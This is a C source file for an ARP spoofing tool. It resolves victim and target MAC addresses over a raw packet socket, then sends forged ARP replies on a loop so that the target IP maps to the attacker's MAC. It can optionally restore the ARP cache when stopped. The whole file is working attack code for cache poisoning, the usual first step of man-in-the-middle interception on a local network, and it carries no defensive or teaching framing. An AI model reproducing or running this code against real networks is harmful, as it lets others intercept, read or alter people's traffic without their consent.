#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <unistd.h>

#include <signal.h>

#include <error.h>
#include <errno.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "net/arp.h"
#include "util.h"

// Seconds
const static int resolve_timeout = 2;

// amount of times to try resolve, with a [resolve_timeout] timeout
const static int resolve_tries = 10;

// Interval in seconds at which to send the spoofing packet
const static int spoof_interval = 2;

// Number of packets to send when restoring arp cache
const static int restore_iterations = 2;

// flags.restore - Restore ARP cache before stopping program
// flags.respond - Respond to ARP requests for the spoofed IP
struct cmdflags flags = {.respond = 1, .restore = 1};

// Set to 0 by sigint handler
int running = 1;

// Used to timeout loops
int timeout = 0;

void sighandler(int signo) {
  // Handle CTRL+C/Terminations
  if (signo == SIGTERM || signo == SIGINT) {
    running = 0;
  }

  // Used for timeout when resolving I.P addresses
  else if (signo == SIGALRM) {
    timeout = 0;
  }
}

int arp_resolve(int sock, struct sockaddr_ll addr_ll, uint32_t src_ip, uint8_t src_mac[6], uint32_t dest_ip, uint8_t out[6]) {
  ArpPacket pack = arp_new(ARP_REQUEST, src_mac, src_ip, ARP_BROADCAST, dest_ip);
  ArpPacket received;
  
  for (int i = 0; i < resolve_tries; i++) {
    sendto(sock, (uint8_t*)&pack, sizeof(ArpPacket), 0, (struct sockaddr*)&addr_ll, sizeof(struct sockaddr_ll));

    timeout = 1;
    alarm(resolve_timeout);
    while (timeout) {
      if (!running)
	goto RESOLVE_FAILURE;
	
      if (recv(sock, (uint8_t*)&received, sizeof(ArpPacket), 0) < 0) {
	// Only call perror if the error was not a signal interruption
	if (errno != EINTR)
	  perror("recv()");
      }
      
      // If the sender IP is the IP we're trying to resolve, and the destination MAC is us
      if (received.oper == ntohs(ARP_REPLY) && received.spa == dest_ip && memcmp(received.tha, src_mac, ETH_ALEN) == 0)
	goto RESOLVE_SUCCESS;
    }
  }

 RESOLVE_FAILURE:
  alarm(0);
  return 0;

 RESOLVE_SUCCESS:
  alarm(0);
  // Copy resolved MAC address to out
  memcpy(out, received.sha, ETH_ALEN);
  return 1;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    util_usage(argv[0]);
    return 0;
  }

  // util.h
  struct InterfaceInfo interface;
  struct IPInfo target;
  struct IPInfo victim;

  // If there was an error with parsing opts (exit with success though, as nothing actually went wrong with the program)
  if (!util_parse_opts(argc, argv, &interface, &victim, &target, &flags))
    exit(EXIT_SUCCESS);

  // Something failed when trying to get info about the interface
  if (!util_get_if_info(&interface))
    exit(EXIT_FAILURE);
  
  //////////////////
  // Parse target IP
  if (!util_parse_ip(target.ip_str, &target.ip)) {
    fprintf(stderr, "Invalid target IP address: %s... exiting.\n\t", target.ip_str);
    exit(EXIT_FAILURE);
  }
  
  //////////////////
  // Parse victim IP if passed
  if (victim.ip_str) {
    if (!util_parse_ip(victim.ip_str, &victim.ip)) {
      fprintf(stderr, "Invalid victim IP address: %s... exiting.\n", victim.ip_str);
      exit(EXIT_FAILURE);
    }
  }

  else {
    // If no victim IP was specified, the target MAC is broadcast
    memcpy(victim.mac, ARP_BROADCAST, 6);
    victim.ip = target.ip;
    victim.ip_str = NULL;
  }

  // ARP Packets will be sent and received through this socket
  int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock == -1) {
    perror("Failed to create raw/ARP socket (Try running with sudo?)... exiting.\n\t");
    exit(EXIT_FAILURE);
  }

  // Mask for signal handler
  sigset_t mask;
  sigaddset(&mask, SIGINT);
  sigaddset(&mask, SIGTERM);
  sigaddset(&mask, SIGALRM);

  // Set signal handler
  struct sigaction sa;
  sa.sa_handler = sighandler;
  sa.sa_mask = mask;
  sigaction(SIGINT, &sa, NULL);
  sigaction(SIGTERM, &sa, NULL);
  sigaction(SIGALRM, &sa, NULL);

  // Destination for sendto()
  // proto = arp
  // interface index = index of interface specified (or default)
  // hardware address len = ETH_ALEN (6 bytes/octets)
  struct sockaddr_ll addr_ll;
  addr_ll.sll_ifindex = interface.index;
  addr_ll.sll_protocol = htons(ETH_P_ARP);
  addr_ll.sll_halen = ETH_ALEN;

  char c;
  // Resolve victim IP address if one was passed
  if (victim.ip_str) {
    printf("Resolving victim I.P address %s...\n", victim.ip_str);
    // Check for failure
    if (!arp_resolve(sock, addr_ll, interface.ip, interface.mac, victim.ip, victim.mac)) {
      printf("Failed to resolve victim I.P address %s. Continue with broadcast instead? (y/n)\n> ", victim.ip_str);
      c = getchar();
    
      // newline
      getchar();
      if (c != 'y')
	exit(EXIT_FAILURE);

      // Parameters for gratuitous arp
      victim.ip = target.ip;
      memcpy(victim.mac, ARP_BROADCAST, 6);
      putchar('\n');
    }

    else {
      printf("Victim I.P resolved!\n\n");
    }
  }

  // Resolve the IP address of the target so that we can restore ARP cache later on
  if (flags.restore) {
    printf("Resolving target I.P address %s...\n", target.ip_str);
    if (!arp_resolve(sock, addr_ll, interface.ip, interface.mac, target.ip, target.mac)) {
      printf("Failed to resolve target I.P. address %s (Possibly no device has it?). Continue without restoring ARP cache? (y/n)\n> ", target.ip_str);
      c = getchar();
      if (c != 'y')
	exit(EXIT_FAILURE);

      flags.restore = 0;
      putchar('\n');
    }
  
    else {
      printf("Target I.P resolved!\n\n");
    }
  }
  
  ArpPacket spoofpack = arp_new(ARP_REPLY, interface.mac, target.ip, victim.mac, victim.ip);
  printf("Spoof Started!\n");

  // SIGALRM handler sets timeout to 0
  timeout = 1;
  alarm(spoof_interval);
  while (running) {
    while (timeout && running);

    // Mask SIGTERM, SIGINT, SIGALRM while sending
    sigprocmask(SIG_BLOCK, &mask, NULL);
    sendto(sock, (uint8_t*)&spoofpack, sizeof(ArpPacket), 0, (struct sockaddr*) &addr_ll, sizeof(struct sockaddr_ll));
    timeout = 1;
    sigprocmask(SIG_UNBLOCK, &mask, NULL);
  }
  // Stop receiving SIGALRM
  alarm(0);
  
  // Mask sigint, sigterm, sigalrm while wrapping up
  sigprocmask(SIG_BLOCK, &mask, NULL);
  if (flags.restore) {
    printf("Restoring ARP cache...\n");
    ArpPacket restorepack = arp_new(ARP_REPLY, target.mac, target.ip, victim.mac, victim.ip);
    for (int i = 0; i < restore_iterations; i++) {
      sendto(sock, (uint8_t*)&restorepack, sizeof(ArpPacket), 0, (struct sockaddr*) &addr_ll, sizeof(struct sockaddr_ll));
      usleep(500000);
    }
    
    printf("ARP cache restored!\n");
  }
  printf("\nSpoof Ended!\n");
  
  close(sock);
  exit(EXIT_SUCCESS);
}
